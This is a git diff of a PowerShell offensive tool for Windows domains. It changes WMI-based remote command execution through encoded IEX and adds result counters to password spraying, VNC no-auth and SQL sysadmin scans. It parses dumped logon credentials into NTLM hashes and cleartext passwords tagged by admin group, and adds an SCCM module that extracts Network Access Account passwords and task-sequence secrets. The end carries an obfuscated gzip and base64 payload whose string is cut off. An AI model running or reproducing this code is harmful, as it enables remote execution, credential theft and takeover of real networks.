-                $encodedCommand = "`$commandToRun = (Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`").CommandToRun; `$result = Invoke-Command -ScriptBlock { `$commandToRun | IEX } | Out-String; Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
-                $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
+
+                $script = @"
+`$commandToRun = (Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`").CommandToRun
+`$result = Invoke-Command -ScriptBlock { `$commandToRun | IEX } | Out-String
+`$result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$result))
+Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null
+"@
+
+                $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
                 $result = Invoke-Execution -ComputerName $ComputerName -Command $encodedCommand
 
-
                 try {
-                    start-sleep -seconds 1
+                    Start-Sleep -Seconds 1
 
-                    if ($LocalAuth) { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -Credential $Cred | Out-Null }
+                    if ($LocalAuth) { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -Credential $cred | Out-Null }
                     else { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null }
-        
-                    $Cleanup = "Success"
 
+                    $Cleanup = "Success"
                 }
                 Catch { $Cleanup = "Failure" }
-                return $result
+                return @($result, $Cleanup, $Class)
             }
 
             function AdminCount {
@@ -4040,7 +4096,9 @@ while (`$true) {
                 })
         }
 
-        # Poll the runspaces and display results as they complete
+        
+        [int]$Global:SuccessCount = 0
+        
         do {
             foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
         
@@ -4049,9 +4107,10 @@ while (`$true) {
                     $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                     $hasDisplayedResult = $false
                     try { $result = $result.Trim() } catch {}
-
-                    # [other conditions for $result]
-                    if ($result -eq "Access Denied") {
+                    
+                    if ($result -eq "Unable to connect") { continue }
+                    
+                    elseif ($result -eq "Access Denied") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                         continue
@@ -4072,22 +4131,29 @@ while (`$true) {
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                         continue
                     } 
+
+                    elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NOT SCCM CLIENT" -NameLength $NameLength -OSLength $OSLength
+                        Continue
+                    }
                          
                     elseif ($result -eq "Successful Connection PME") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
                     } 
-            
-                    elseif ($result -eq "Unable to connect") {}
 
                     elseif ($result -match "[a-zA-Z0-9]") {
                 
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
+                            $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                         } 
                         else {
+                            $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
@@ -4102,6 +4168,7 @@ while (`$true) {
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                 "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                 "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
+                                "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                 default { $null }
                             }
 
@@ -4124,6 +4191,7 @@ while (`$true) {
                         }
                     } 
                     elseif ($result -notmatch "[a-zA-Z0-9]") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
@@ -4137,8 +4205,7 @@ while (`$true) {
 
             Start-Sleep -Milliseconds 100
         } while ($runspaces | Where-Object { -not $_.Completed })
-
-        # Clean up
+        
         $runspacePool.Close()
         $runspacePool.Dispose()
 
@@ -4412,8 +4479,7 @@ while (`$true) {
             Write-Host
             Write-Host
             Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-            Write-Host "Valid credential pairs found: " -NoNewline
-            Write-Host $SuccessUsers.Count
+            Write-Host "Valid credential pairs `n " -NoNewline
             if (!$SuccessOnly) { Write-Host } Else {}
 
             if (!$SuccessOnly) {
@@ -4461,6 +4527,10 @@ while (`$true) {
             $Unique | Set-Content "$Spraying\$Domain-Hashes-Users.txt"
             
         }
+
+        [int]$SuccessUsersInt = $SuccessUsers.Count
+        if ($SuccessUsers -gt 0 ) { [int]$Global:SuccessCount = [int]$SuccessUsersInt }
+        else { $Global:SuccessCount = 0 }
  
     }
 
@@ -4582,7 +4652,7 @@ while (`$true) {
                 })
         }
 
-        # Poll the runspaces and display results as they complete
+        [int]$Global:SuccessCount = 0
         do {
             foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
         
@@ -4602,6 +4672,7 @@ while (`$true) {
                         continue
                     } 
                     elseif ($result -eq "Supported") {
+                        $SuccessCount++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "AUTH NOT REQUIRED" -NameLength $NameLength -OSLength $OSLength
                         $ComputerName | Out-File -FilePath "$VNC\.VNC-Non-Auth.txt" -Encoding "ASCII" -Append
                     } 
@@ -4617,7 +4688,6 @@ while (`$true) {
 
         Get-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue" | Sort-Object | Get-Unique | Set-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue"
 
-        # Clean up
         $runspacePool.Close()
         $runspacePool.Dispose()
 
@@ -5197,6 +5267,8 @@ public class Advapi32 {
 
         $InstanceLength = ($AllInstances | ForEach-Object { $_.Length } | Measure-Object -Maximum).Maximum
 
+        [int]$Global:SuccessCount = 0
+        
         do {
             foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
         
@@ -5226,12 +5298,14 @@ public class Advapi32 {
                     }
 
                     elseif ($result -eq "Success") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $IP
                         $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
                         continue            
                     }
 
                     elseif ($result -eq "SUCCESS SYSADMIN") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $IP
                         $($runspace.Instance) | Add-Content -Path "$SysAdminFilePath" -Encoding "ASCII" -Force
                         continue            
@@ -5239,12 +5313,14 @@ public class Advapi32 {
            
             
                     elseif ($result -eq "SUCCESS NOT SYSADMIN") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $IP
                         $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
                         continue            
                     }
 
                     elseif ($Command -ne "" -and $Result -ne "") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $IP
                         $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
                         Write-Output ""
@@ -5267,8 +5343,7 @@ public class Advapi32 {
 
             Start-Sleep -Milliseconds 100
         } while ($runspaces | Where-Object { -not $_.Completed })
-
-        # Clean up
+        
         $runspacePool.Close()
         $runspacePool.Dispose()
 
@@ -5420,7 +5495,7 @@ public class Advapi32 {
                 })
         }
 
-        # Poll the runspaces and display results as they complete
+        [int]$Global:SuccessCount = 0
         do {
             foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
                 if ($runspace.Handle.IsCompleted) {
@@ -5436,6 +5511,7 @@ public class Advapi32 {
                     if ($result.WMIAccess -eq $True) { $successfulProtocols += "WMI" }
 
                     if ($successfulProtocols.Count -gt 0) {
+                        $Global:SuccessCount ++
                         $statusText = $successfulProtocols -join ', '
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText $statusText -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain
@@ -5451,7 +5527,6 @@ public class Advapi32 {
             Start-Sleep -Milliseconds 100
         } while ($runspaces | Where-Object { -not $_.Completed })
 
-        # Clean up
         $runspacePool.Close()
         $runspacePool.Dispose()
     }
@@ -6097,14 +6172,19 @@ public class Advapi32 {
 
                 foreach ($line in $match.Split("`n")) {
                     switch -Regex ($line) {
-                        "Username" { $username = $line.Split(":")[1].Trim() }
-                        "Domain" { 
-                            # Extracting the domain and keeping only the NetBIOS name
+                        "Username" {
+                            $username = $line.Split(":")[1].Trim()
+                        }
+                        "Domain" {
                             $domain = $line.Split(":")[1].Trim()
                             $domain = ($domain -split "\.")[0]
                         }
-                        "NTLM" { $NTLM = $line.Split(":")[1].Trim() }
-                        "Password" { $password = ($line -split ":", 2)[1].Trim() }
+                        "NTLM" {
+                            $NTLM = $line.Split(":")[1].Trim()
+                        }
+                        "Password" {
+                            $password = ($line -split ":", 2)[1].Trim()
+                        }
                     }
                 }
 
@@ -6152,75 +6232,89 @@ public class Advapi32 {
             }
         }
 
+
         $LogonPasswordPath = "$LogonPasswords"
         $Files = Get-ChildItem -Path $LogonPasswordPath -Filter *LogonPasswords.txt
         $Searcher = New-Searcher -domain "$Domain"
 
         foreach ($File in $Files) {
-            # Extract computer name (DNS Hostname) from the file name using regex.
+            # Extract computer name (DNS Hostname) from the file name using regex
             $Computer = $File.BaseName -replace "-LogonPasswords$", ""
-
+    
             Write-Host
             Write-Host "-[$Computer]-"
             Write-Host
-
+    
             $FileOutput = Get-Content -Raw -Path $File.FullName
-
+    
+            if ($FileOutput -match '\[SYSTEM\]:(.*)') {
+                $SYSTEMName = $matches[1].Trim()
+            }
+    
             $ParsedResults = Parse-LogonPassword -raw $FileOutput
+    
             foreach ($user in $ParsedResults) {
-                if ($null -ne $user.Identity) {
+                if ($user.Identity -ne $null) {
                     $username = $user.Identity.Split('\')[1]
                     if (AdminCount -UserName $username -Searcher $Searcher) {
                         $user.Notes = "[AdminCount=1] "
                     }
                 }
             }
-
+    
             $ParsedResults |
             Where-Object { $_.NTLM -or $_.Password } |
             ForEach-Object {
                 $notesAdditions = @()
                 New-Item -ItemType "Directory" -Path $LogonPasswords -Name $Computer -Force | Out-Null
                 $ComputerDirectory = "$LogonPasswords\$Computer"
-
-                $userName = ($_.Identity -split '\\')[1]  # Extract username from Identity
+        
+                $userName = ($_.Identity -split '\\')[1]
                 Append-BHQuery -UserName $Username -Domain $Domain
-
+        
                 if ($userName -in $DomainAdmins) { $notesAdditions += "[Domain Admin] " }
                 if ($userName -in $EnterpriseAdmins) { $notesAdditions += "[Enterprise Admin] " }
                 if ($userName -in $ServerOperators) { $notesAdditions += "[Server Operator] " }
                 if ($userName -in $AccountOperators) { $notesAdditions += "[Account Operator] " }
-
+                if ($_.Identity -like "$SYSTEMName\*") { $notesAdditions = "[LOCAL]" }
+        
                 # Check if NTLM value indicates an empty password
                 if ($_.NTLM -eq "31d6cfe0d16ae931b73c59d7e0c089c0") {
                     $notesAdditions += "[NTLM=Empty Password] "
                 }
-
-                if ($($_.Password) -ne $null) {
+        
+                if ($_.Password -ne $null) {
                     # Extract username from Identity
-                    $userName = ($_.Identity -split '\\')[1]  
-
+                    $userName = ($_.Identity -split '\\')[1]
+            
                     # Check if username does not end with $
                     if ($userName -notmatch '\$$') {
                         $notesAdditions += "[Cleartext Password] "
                     }
                 }
-
+        
                 $_.Notes += ($notesAdditions -join ' ')
-
+        
                 Write-Host "Username  : $($_.Identity.ToLower())"
                 Write-Host "NTLM      : $($_.NTLM)"
+        
                 if ($Username -notlike "*$*") {
                     Append-BHQuery -UserName $Username -Domain $Domain -RC4 $($_.NTLM) -RC4Property
                     Append-BHQuery -UserName $Username -Domain $Domain -UserOwned
-                    
                 }
-                if ($($_.Password) -eq $null) {} Else { Write-Host "Password  : $($_.Password)" }
-                if (($_.Notes) -eq "") {} Else {
+        
+                if ($_.Password -ne $null) {
+                    Write-Host "Password  : $($_.Password)"
+                }
+        
+                if ($_.Notes -ne "") {
                     Write-Host "Notes     : " -NoNewline
-
+            
                     # Highlight notes in yellow if it contains specific flags
-                    if ($_.Notes -match "AdminCount=1" -or $_.Notes -match "NTLM=Empty Password" -or $_.Notes -match "Cleartext Password" ) {
+                    if ($_.Notes -match "LOCAL") {
+                        Write-Host -ForegroundColor Yellow -NoNewline "[Local Account]"
+                    }
+                    elseif ($_.Notes -match "AdminCount=1" -or $_.Notes -match "NTLM=Empty Password" -or $_.Notes -match "Cleartext Password") {
                         Write-Host -ForegroundColor Yellow -NoNewline "$($_.Notes)"
                     }
                     else {
@@ -6230,10 +6324,11 @@ public class Advapi32 {
                     "$($_.Identity):$($_.NTLM)" | Add-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Encoding "ASCII" -Force
                 }
                 Write-Host ""
-            
+        
                 Move-Item -Path $File.FullName -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"
             }
         }
+
 
         Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Sort-Object | Get-unique | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force
     
@@ -6643,6 +6738,126 @@ public class Advapi32 {
     }
 
     ################################################################################################################
+    ############################################## Function: Parse-SCCM ############################################
+    ################################################################################################################
+
+    function Parse-SCCM {
+        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
+        Start-Sleep -Seconds 2
+
+        Get-ChildItem -Path $SCCM -Filter '*-SCCM.txt' | ForEach-Object {
+            $DirectoryName = $_.Name -replace "-SCCM.txt$"
+            $DirectoryPath = Join-Path -Path $SCCM -ChildPath $DirectoryName
+            New-Item -ItemType 'Directory' -Name $DirectoryName -Path $SCCM -Force | Out-Null
+
+            $newFilePath = Join-Path -Path $DirectoryPath -ChildPath $_.Name
+            Move-Item -Path $_.FullName -Destination $newFilePath -Force
+            Process-File -FilePath $newFilePath -DirectoryPath $DirectoryPath -ComputerName $DirectoryName
+        }
+    }
+
+    function Process-File {
+        param (
+            [string]$FilePath,
+            [string]$DirectoryPath,
+            [string]$ComputerName
+        )
+
+        [string]$DataOutput = Get-Content -Path $FilePath
+
+        $TaskSequences = @()
+        $UniqueSequences = @{}
+        $UniqueCredentials = @{}
+        $InterestingFiles = @()
+
+        $TaskSequences += Select-String -InputObject $DataOutput -Pattern "<sequence version=.*?</sequence>" -AllMatches
+        $counter = 0
+
+        # Process each sequence, save only if unique
+        foreach ($Match in $TaskSequences.Matches) {
+            $sequenceHash = [System.BitConverter]::ToString([System.Security.Cryptography.HashAlgorithm]::Create("MD5").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Match.Value)))
+
+            if (-not $UniqueSequences.ContainsKey($sequenceHash)) {
+                $UniqueSequences[$sequenceHash] = $true
+                $sequenceXml = [xml]$Match.Value
+                $filename = Join-Path -Path $DirectoryPath -ChildPath "TaskSequence_$counter.xml"
+                $sequenceXml.Save($filename)
+                $counter++
+
+                # Check for specific keywords
+                $keywords = @('OSDLocalAdminPassword', 'OSDDomainName', 'OSDJoinPassword', 'OSDJoinAccount', 'OSDRegisteredUserName', 'OSDRegisteredOrgName', 'net user', 'convertto-securestring', 'password')
+                foreach ($keyword in $keywords) {
+                    if ($sequenceXml.InnerXml -match $keyword) {
+                        $InterestingFiles += $filename | Split-Path -Leaf
+                        break
+                    }
+                }
+            }
+        }
+
+        if ($counter -gt 0) {
+            Write-Host ""
+            Write-Host ""
+            Write-Host "-[$ComputerName]-"
+            Write-Host ""
+ 
+            Write-Host "Task Sequences"
+            Write-Host "Directory Path  : $DirectoryPath"
+            Write-Host "Task Sequences  : Found $($counter) Task Sequences and saved to XML"
+
+            if ($InterestingFiles.Count -gt 0) {
+                Write-Host "Possible Creds  : " -NoNewline
+                Write-Host "$($InterestingFiles -join ', ')" -NoNewline -ForegroundColor "Yellow"
+                Write-Host " <--- check for creds!"
+            }
+        }
+
+        Write-Host ""
+
+        $NAACredentials = @()
+        $NAACredentials += Select-String -InputObject $DataOutput -Pattern "Network Access Username:\s*(.+?)\s*Network Access Password:\s*(\S+)" -AllMatches
+
+        foreach ($cred in $NAACredentials.Matches) {
+            $NAAUsername = ($cred.Groups[1].Value -replace '[\x00-\x1F\x7F]', '').Trim()
+            $NAAPassword = ($cred.Groups[2].Value -replace '[\x00-\x1F\x7F]', '').Trim()
+            $Credential = "$NAAUsername`:$NAAPassword"
+
+            # Extract domain and username for BH Query
+            $Split = $NAAUsername -split '\\'
+            $NAADomain = $Split[0]
+            $NAAUser = $Split[1]
+            Append-BHQuery -UserName $NAAUser -Domain $NAADomain -UserOwned -Password $NAAPassword -PasswordProperty
+
+            if (-not $UniqueCredentials.ContainsKey($Credential)) {
+                $UniqueCredentials[$Credential] = $true
+            }
+        }
+
+        if ($UniqueCredentials.Count -gt 0) {
+            if ($counter -lt 1) {
+                Write-Host ""
+                Write-Host "-[$ComputerName]-"
+                Write-Host ""
+            }
+
+            $outputFile = Join-Path -Path $DirectoryPath -ChildPath "NAA-Credentials.txt"
+
+            Write-Host "Network Access Accounts"
+            Write-Host "NAA File Path   : $outputFile"
+
+            foreach ($Credential in $UniqueCredentials.Keys) {
+                Write-Host "NAA Credentials :" -NoNewline
+                Write-Host " $Credential" -ForegroundColor "Yellow"
+            }
+
+            $UniqueCredentials.Keys | Out-File -FilePath $outputFile
+        }
+    }
+
+
+
+
+    ################################################################################################################
     ################################################ Execute defined functions #####################################
     ################################################################################################################
 
@@ -6676,10 +6891,22 @@ public class Advapi32 {
     if (!$NoParse) { if ($Module -eq "LogonPasswords") { Parse-LogonPasswords } }
     if (!$NoParse) { if ($Module -eq "KerbDump") { Parse-KerbDump } }
     if (!$NoParse) { if ($Module -eq "NTDS") { Parse-NTDS -DirectoryPath $NTDS } }
+    if (!$NoParse) { if ($Module -eq "SCCM") { Parse-SCCM } }
 
     RestoreTicket
+    
+    if ($Global:SuccessCount -gt 0 ) {
+        Write-host "`n`Success Count    : " -NoNewline
+        Write-Host "$SuccessCount" -ForegroundColor "Green"
 
-    Write-Host ""
+    }
+
+    else {
+
+        Write-host "`n`Success Count    : " -NoNewline
+        Write-Host "$SuccessCount"
+
+    }
     
     $Time = (Get-Date).ToString("HH:mm:ss")
     Write-Host "Script Completed : $Time"
@@ -6906,15 +7133,36 @@ foreach ($user in $users) {
 '@
 
 
+$Global:LocalSCCM = @'
+function Invoke-LocalSCCM {
+
+    $lss=New-Object IO.MemoryStream(,[Convert]::frOMbaSe64StrInG("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